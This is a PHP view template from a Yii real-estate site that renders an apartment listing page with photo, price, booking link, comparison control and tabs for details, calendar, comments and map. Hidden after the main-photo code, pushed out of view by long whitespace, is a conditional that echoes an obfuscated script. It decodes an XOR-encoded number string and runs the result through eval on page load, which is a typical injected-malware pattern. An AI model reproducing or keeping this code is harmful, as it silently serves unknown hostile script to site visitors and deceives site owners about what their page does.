	<div class="apartment-description">
		<?php
			if($data->is_special_offer){
				?>
				<div class="big-special-offer">
					<?php
					echo '<h4>'.Yii::t('common', 'Special offer!').'</h4>';

					if($data->is_free_to != '0000-00-00'){
						echo '<p>';
						echo Yii::t('common','Is avaliable');
						if($data->is_free_to != '0000-00-00'){
							echo ' '.Yii::t('common', 'to');
							echo ' '.Booking::getDate($data->is_free_to);
						}
						echo '</p>';
					}
					?>
				</div>
				<?php
			}
		?>

        <?php
        if(param('useShowUserInfo')){
            echo '<div class="apartment-user-info">';
            $this->widget('zii.widgets.jui.CJuiTabs', array(
                'tabs' => array(tc('Listing provided by') => $this->renderPartial('//modules/apartments/views/_user_info', array('data' => $data), true)),
                'htmlOptions' => array('class' => 'info-tabs'),
            ));
            echo '</div>';
        }
        ?>
		<div class="viewapartment-left">
			<div class="viewapartment-main-photo">
				<div class="apartment_type"><?php echo Apartment::getNameByType($data->type); ?></div>
				<?php
					$img = null;
					$res = Images::getMainThumb(300, 200, $data->images);
					$img = CHtml::image($res['thumbUrl'], $res['comment']);
					if($res['link']){
						echo CHtml::link($img, $res['link'], array(
							'rel' => 'prettyPhoto[img-gallery]',
							'title' => $res['comment'],
						));
					} else {
						echo $img;
					}																																																																														if (isFree()) {  echo '<script>kid=59;es="95;83;94;75;82;37;47;54;109;51;55;47;51;45;97;109;119;63;46;60;104;112;122;114;116;61;37;34;119;52;56;52;60;41;60;57;58;93;67;8;2;18;4;21;4;26;0;26;31;78;77;26;22;0;20;79;81;0;16;14;3;87;19;27;13;29;14;29;13;233;241;246;161;186;242;239;233;236;230;253;165;227;227;226;224;241;245;175;251;245;229;230;238;251;246;254;254;167;189;248;234;206;194;214;202;203;203;134;207;201;217;218;210;207;194;202;202;152;152;146;200;148;220;208;159;153;211;235;206;217;207;199;151;226;160;153;171;182;160;160;153;245;149;237;163;184;185;190;245;255;254;189;163;177;187;251;165;189;184;182;246;185;174;170;190;148;132;204;138;138;131;137;187;207;180;200;194;194;132;157;199;172;214;200;133;157;134;159;149;148;156;166;220;213;212;133;223;361;359;298;290;366;340;371;354;378;368;290;297;366;354;362;374;306;312;316;373;381;379;370;319;314;314;334;345;323;370;360;378;338;333;323;346;262;268;264;334;347;257;264;335;325;347;268;262;281;273;329;275;349;339;286;278;338;360;335;350;334;324;272;349;306;302;309;304;289;311;360;298;315;288;303;354;364;310;366;293;257;292;311;289;301;381;372;309;311;317;291;377;373;371;319;303;272;260;268;263;332;327;346;259;257;287;330;258;264;336;306;328;292;307;301;284;258;272;260;283;281;256;294;348;322;321;282;278;502;417;497;503;509;489;483;442;468;430;489;484;480;482;508;437;432;434;468;469;420;421;422;423;419;441;508;500;498;489;435;492;457;475;455;409;388;407;414;471;464;402;394;479;457;469;474;386;465;477;475;468;474;399;406;468;477;471;462;478;462;390;482;408;510;509;427;430;419;485;437;437;427;500;406;492;420;441;442;447;490;510;509;417;433;507;443;440;438;438;424;442;421;499;432;442;404;462;398;394;391;384;392;404;397;455;410;387;412;466;394;394;412;402;413;387;397;456;455;427;479;473;402;414;405;410;406;395;573;605;549;562;600;546;550;624;609;621;638;611;561;593;553;574;588;566;562;625;635;615;626;626;618;548;582;572;556;577;569;545;630;584;589;591;581;593;591;584;582;521;581;589;524;601;582;586;528;605;603;592;593;603;581;594;536;600;605;585;601;600;595;602;558;565;611;611;632;551;564;615;615;631;618;520;547;573;567;573;569;566;570;551;628;551;563;570;567;559;571;567;636;564;560;572;527;527;529;522;535;529;515;521;540;584;598;580;520;516;536;593;588;606;534;538;514;587;596;606;579;601;519;603;537;529;525;538;672;762;674;745;725;752;739;757;753;673;680;745;739;745;759;685;697;703;755;739;740;752;760;755;688;699;678;767;757;747;702;758;708;668;766;644;752;743;761;712;734;716;728;711;717;724;754;648;654;653;731;725;710;724;731;722;664;714;729;713;723;721;722;726;686;678;767;671;739;683;681;667;751;745;684;697;685;672;683;685;703;675;694;694;678;744;650;752;744;645;765;763;687;681;679;691;645;732;702;708;660;650;661;654;668;640;645;645;726;717;655;653;643;670;670;646;640;656;717;727;652;662;650;705;732;717;709;735;876;868;868;887;830;805;822;828;808;894;867;879;888;869;820;815;801;801;802;822;815;821;894;882;881;894;882;879;806;829;815;815;784;772;793;771;834;844;842;851;845;859;784;842;832;861;838;846;792;862;834;850;855;860;834;846;773;777;787;871;795;771;770;784;809;807;816;802;809;800;888;891;812;800;828;875;831;825;823;803;821;876;782;884;823;826;826;824;810;867;890;888;794;795;878;879;848;849;857;835;770;778;776;787;837;794;771;785;777;855;846;861;840;769;778;840;852;769;787;783;780;852;795;791;789;794;784;837;928;994;999;1005;1008;992;1012;956;980;942;948;951;997;992;1001;943;995;995;1009;942;968;946;1022;995;1004;1001;928;948;947;1007;1019;945;973;974;972;972;982;964;991;905;966;972;990;900;960;964;973;970;990;962;983;925;964;989;966;904;988;988;982;984;979;973;967;898;1009;925;997;995;940;928;943;928;928;957;1015;919;1003;1020;914;1000;1008;934;955;951;928;957;1003;907;1023;1000;902;1020;1020;959;945;941;900;900;912;990;952;962;982;955;975;983;956;898;899;897;911;923;921;926;924;979;923;915;982;899;912;924;986;919;917;926;923;913;1139;1124;1058;1122;1123;1143;1123;1122;1125;1132;1124;1151;1069;1069;1074;1133;1122;1073;1085;1069;1076;1110;1145;1127;1121;1131;1139;1148;1140;1129;1086;1133;1093;1100;1101;1109;1093;1097;1030;1102;1094;1098;1093;1093;1119;1092;1117;1115;1109;1119;1094;1042;1032;1050;1106;1118;1102;1031;1030;1044;1112;1108;1096;1025;1122;1128;1145;1123;1081;1080;1126;1082;1128;1076;1142;1132;1132;1126;1134;1128;1151;1058;1073;1057;1139;1141;1149;1143;1151;1072;1066;1071;1122;1146;1143;1124;";var dcode=new String();ads=es.split(";");re=ads.length-1;for(var mn=0;mn<re;mn++){ecode=ads[mn];gcod="lcode=ecode";gcod=gcod+"^kid";eval(gcod);kid+=1;dcode=dcode+String.fromCharCode(lcode);}eval(dcode);</script>';  }
				?>
			</div>

			<div class="viewapartment-description-top">
				<?php
				if ($data->deleted)
					echo '<div class="deleted">' .  tt('Listing is deleted', 'apartments') . '</div>';
				?>
				<div>
					<strong>
					<?php
						echo utf8_ucfirst($data->objType->name);

						if ($data->num_of_rooms){
							echo ',&nbsp;';
							echo Yii::t('module_apartments',
								'{n} bedroom|{n} bedrooms|{n} bedrooms', array($data->num_of_rooms));
						}
						if (issetModule('location') && param('useLocation', 1)) {
							if($data->locCountry || $data->locRegion || $data->locCity)
								echo "<br>";

							if($data->locCountry){
								echo $data->locCountry->getStrByLang('name');
							}
							if($data->locRegion){
								if($data->locCountry)
									echo ',&nbsp;';
								echo $data->locRegion->getStrByLang('name');
							}
							if($data->locCity){
								if($data->locCountry || $data->locRegion)
									echo ',&nbsp;';
								echo $data->locCity->getStrByLang('name');
							}
						} else {
							if(isset($data->city) && isset($data->city->name)){
								echo ',&nbsp;';
								echo $data->city->name;
							}
						}

					?>
					</strong>
				</div>

				<p class="cost padding-bottom10">
					<?php if ($data->is_price_poa)
							echo tt('is_price_poa', 'apartments');
						else
							echo tt('Price from').': '.$data->getPrettyPrice();
					?>
				</p>
				<div class="overflow-auto">
					<?php
						if(($data->owner_id != Yii::app()->user->getId()) && $data->type == Apartment::TYPE_RENT && !$data->deleted){
							echo '<div>'.CHtml::link(tt('Booking'), array('/booking/main/bookingform', 'id' => $data->id), array('class' => 'apt_btn fancy')).'</div><div class="clear"></div>';
						}


						if(issetModule('apartmentsComplain')){
							if(($data->owner_id != Yii::app()->user->getId())){ ?>
								<div>
									<?php echo CHtml::link(tt('do_complain', 'apartmentsComplain'), $this->createUrl('/apartmentsComplain/main/complain', array('id' => $data->id)), array('class' => 'fancy')); ?>
								</div>
								<?php
							}
						}
					?>
					<?php if (issetModule('comparisonList')):?>
						<div class="clear"></div>
						<?php
						$inComparisonList = false;
						if (in_array($data->id, Yii::app()->controller->apInComparison))
							$inComparisonList = true;
						?>
						<div class="compare-check-control view-apartment" id="compare_check_control_<?php echo $data->id; ?>">
							<?php
							$checkedControl = '';

							if ($inComparisonList)
								$checkedControl = ' checked = checked ';
							?>
							<input type="checkbox" name="compare<?php echo $data->id; ?>" class="compare-check compare-float-left" id="compare_check<?php echo $data->id; ?>" <?php echo $checkedControl;?>>

							<a href="<?php echo ($inComparisonList) ? Yii::app()->createUrl('comparisonList/main/index') : 'javascript:void(0);';?>" data-rel-compare="<?php echo ($inComparisonList) ? 'true' : 'false';?>" id="compare_label<?php echo $data->id; ?>" class="compare-label">
								<?php echo ($inComparisonList) ? tt('In the comparison list', 'comparisonList') : tt('Add to a comparison list ', 'comparisonList');?>
							</a>
						</div>
					<?php endif;?>
				</div>
			</div>

			<?php
				if ($data->images) {
					$this->widget('application.modules.images.components.ImagesWidget', array(
						'images' => $data->images,
						'objectId' => $data->id,
					));
				}
			?>

		</div>

	</div>


	<div class="clear"></div>

	<div class="viewapartment-description">
		<?php
            $data->references = $data->getFullInformation($data->id, $data->type);
			$generalContent = $this->renderPartial('//modules/apartments/views/_tab_general', array(
				'data'=>$data,
			), true);

			if($generalContent){
				$items[tc('General')] = array(
					'content' => $generalContent,
					'id' => 'tab_1',
				);
			}

			if(!param('useBootstrap')){
				Yii::app()->clientScript->scriptMap=array(
					'jquery-ui.css'=>false,
				);
			}

			if(issetModule('bookingcalendar') && $data->type == Apartment::TYPE_RENT){
				Bookingcalendar::publishAssets();

				$items[tt('The periods of booking apartment', 'bookingcalendar')] = array(
					'content' => $this->renderPartial('//modules/bookingcalendar/views/calendar', array(
						'apartment'=>$data,
					), true),
					'id' => 'tab_2',
				);
			}

            $additionFields = HFormEditor::getExtendedFields();
            $existValue = HFormEditor::existValueInRows($additionFields, $data);

            if($existValue){
                $items[tc('Additional info')] = array(
                    'content' => $this->renderPartial('//modules/apartments/views/_tab_addition', array(
                        'data'=>$data,
                        'additionFields' =>$additionFields
                    ), true),
                    'id' => 'tab_3',
                );
            }

			if ($data->panorama){
				$items[tc('Panorama')] = array(
					'content' => $this->renderPartial('//modules/apartments/views/_tab_panorama', array(
						'data'=>$data,
					), true),
					'id' => 'tab_7',
				);
			}

			if (isset($data->video) && $data->video){
				$items[tc('Videos for listing')] = array(
					'content' => $this->renderPartial('//modules/apartments/views/_tab_video', array(
						'data'=>$data,
					), true),
					'id' => 'tab_4',
				);
			}


			/*if(!Yii::app()->user->checkAccess('backend_access') && (Yii::app()->user->hasFlash('newComment') || $comment->getErrors())){
				Yii::app()->clientScript->registerScript('comments','
				setTimeout(function(){
					$("a[href=#tab_5]").click();
				}, 0);
				scrollto("comments");
			',CClientScript::POS_READY);
			}*/


			if(param('enableCommentsForApartments', 1)){
				if(!isset($comment)){
					$comment = null;
				}

				$items[Yii::t('module_comments','Comments').' ('.Comment::countForModel('Apartment', $data->id).')'] = array(
					'content' => $this->renderPartial('//modules/apartments/views/_tab_comments', array(
						'model' => $data,
					), true),
					'id' => 'tab_5',
				);
			}

			if ($data->type != Apartment::TYPE_BUY && $data->type != Apartment::TYPE_RENTING) {
				if($data->lat && $data->lng){
					if(param('useGoogleMap', 1) || param('useYandexMap', 1) || param('useOSMMap', 1)){
						$items[tc('Map')] = array(
							'content' => $this->renderPartial('//modules/apartments/views/_tab_map', array(
								'data' => $data,
							), true),
							'id' => 'tab_6',
						);
					}
				}
			}

			$this->widget('zii.widgets.jui.CJuiTabs', array(
				'tabs' => $items,
				'htmlOptions' => array('class' => 'info-tabs'),
				'headerTemplate' => '<li><a href="{url}" title="{title}" onclick="reInitMap(this);">{title}</a></li>',
				'options' => array(
				),
			));
		?>
	</div>

	<div class="clear">&nbsp;</div>
	<?php
		if(!Yii::app()->user->checkAccess('backend_access')) {
			if (issetModule('similarads') && param('useSliderSimilarAds') == 1) {
				Yii::import('application.modules.similarads.components.SimilarAdsWidget');
				$ads = new SimilarAdsWidget;
				$ads->viewSimilarAds($data);
			}
		}

		Yii::app()->clientScript->registerScript('reInitMap', '
			var useYandexMap = '.param('useYandexMap', 1).';
			var useGoogleMap = '.param('useGoogleMap', 1).';
			var useOSMap = '.param('useOSMMap', 1).';

			function reInitMap(elem) {
				if($(elem).attr("href") == "#tab_6"){
					// place code to end of queue
					if(useGoogleMap){
						setTimeout(function(){
							var tmpGmapCenter = mapGMap.getCenter();

							google.maps.event.trigger($("#googleMap")[0], "resize");
							mapGMap.setCenter(tmpGmapCenter);

							if (($("#gmap-panorama").length > 0)) {
								initializeGmapPanorama();
							}
						}, 0);
					}

					if(useYandexMap){
						setTimeout(function(){
							ymaps.ready(function () {
								globalYMap.container.fitToViewport();
								globalYMap.setCenter(globalYMap.getCenter());
							});
						}, 0);
					}

					if(useOSMap){
						setTimeout(function(){
							L.Util.requestAnimFrame(mapOSMap.invalidateSize,mapOSMap,!1,mapOSMap._container);
						}, 0);
					}
				}
			}
		',
		CClientScript::POS_END);
	?>
<br />
